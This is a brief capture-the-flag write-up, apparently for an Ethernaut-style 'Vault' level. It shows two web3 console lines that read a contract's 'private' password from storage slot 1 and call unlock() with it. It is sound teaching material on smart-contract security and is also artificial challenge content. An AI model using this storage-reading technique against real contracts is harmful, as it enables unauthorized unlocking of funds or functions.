# Level 8 - Vault

For this challenge, you need to access the contract's state, fetch the value of the ```password``` variable and then call ```unlock()```.

In the console:

```js
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```
